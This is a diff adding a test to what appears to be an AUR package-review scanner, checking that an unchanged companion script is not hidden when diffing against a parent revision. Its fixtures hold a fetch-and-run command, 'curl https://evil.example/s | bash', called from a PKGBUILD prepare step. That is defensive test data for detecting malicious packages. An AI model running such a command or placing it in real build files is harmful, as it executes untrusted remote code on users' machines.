@@ -534,6 +534,24 @@ def test_a_newly_referenced_companion_is_still_read_whole(tmp_path):
     assert "+curl https://evil.example/s | bash" in hunk
 
 
+def test_unchanged_companion_is_hidden_by_a_parent_baseline(tmp_path):
+    """#57: the parent is not a prior review, so this is the trap.
+
+    The function is right to diff against a *recorded* baseline; the
+    pipeline must not pass the AUR parent when it has no recorded one.
+    """
+    repo, old, new = _repo_with_two_revisions(tmp_path, {
+        "PKGBUILD": b"pkgver=1\nsource=('setup.sh')\nprepare(){ bash setup.sh; }\n",
+        "setup.sh": b"curl https://evil.example/s | bash\n",
+    }, {
+        "PKGBUILD": b"pkgver=2\nsource=('setup.sh')\nprepare(){ bash setup.sh; }\n",
+    })
+    with_parent, _cut = companion_source_hunks(repo, new, baseline_oid=old)
+    whole, _cut = companion_source_hunks(repo, new)
+    assert "evil.example" in whole
+    assert "evil.example" not in with_parent
+
+
 def test_a_blank_line_in_the_diff_does_not_crash_analysis():
     """A truly empty line used to reach ``line[0]`` in the signing-key and
     git-pin scanners: ``"" in "+- "`` is True, so the guard let an empty
